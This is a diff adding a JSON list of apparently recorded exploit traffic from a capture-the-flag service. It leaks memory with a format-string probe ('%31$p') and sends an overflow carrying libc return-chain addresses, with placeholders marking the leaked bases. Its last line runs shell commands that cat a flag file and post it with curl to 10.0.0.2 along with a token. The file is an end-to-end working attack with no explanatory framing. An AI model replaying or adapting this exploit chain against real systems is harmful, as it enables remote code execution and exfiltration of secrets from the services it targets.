@@ -1,0 +1,8 @@
+[
+    "1Who r u?\\n", 
+    "0%31$p\\n", 
+    "1welc{{{HEAP_BASE:93551:3:ORI:4:0x656d6f}}}!0x{{{LIBC_BASE:133168:12:HEX:10:0x7fe595467830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:135426:8:ORI:72:0x7fe595468102}}}{{{LIBC_BASE:1625431:8:ORI:80:0x7fe5955d3d57}}}{{{LIBC_BASE:283536:8:ORI:88:0x7fe59548c390}}}\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01HTTP/1.1 404 Not Fo{{{HEAP_BASE:28277:3:ORI:194:0x646e75}}}\\r\\nCo{{{HEAP_BASE:95342:3:ORI:131:0x65746e}}}nt-T{{{HEAP_BASE:94329:3:ORI:98:0x657079}}}:{{{HEAP_BASE:95264:3:ORI:102:0x657420}}}xt/html; cha{{{HEAP_BASE:95090:3:ORI:117:0x657372}}}t=UTF-8\\r\\nCo{{{HEAP_BASE:95342:3:ORI:131:0x65746e}}}nt{{{HEAP_BASE:85037:3:ORI:136:0x654c2d}}}ngth: 23\\r{{{HEAP_BASE:86794:3:ORI:148:0x65530a}}}{{{HEAP_BASE:95858:3:ORI:163:0x657672}}}r: Eas{{{HEAP_BASE:86905:3:ORI:160:0x655379}}}{{{HEAP_BASE:95858:3:ORI:163:0x657672}}}r (Linux)\\r\\n\\r\\n<h3>P{{{HEAP_BASE:92001:3:ORI:184:0x656761}}} Not Fo{{{HEAP_BASE:28277:3:ORI:194:0x646e75}}}</h3>", 
+    "0whoami\\nwhoami\\ncurl http://10.0.0.2/api/flag/submit {{{HEAP_BASE:11565:3:ORI:51:0x642d2d}}}ata \"flag=`cat /flags/f{{{HEAP_BASE:93025:3:ORI:77:0x656b61}}}-cgi/flag`&t{{{HEAP_BASE:93039:3:ORI:92:0x656b6f}}}n=aXVY498k\"\\n"
+]
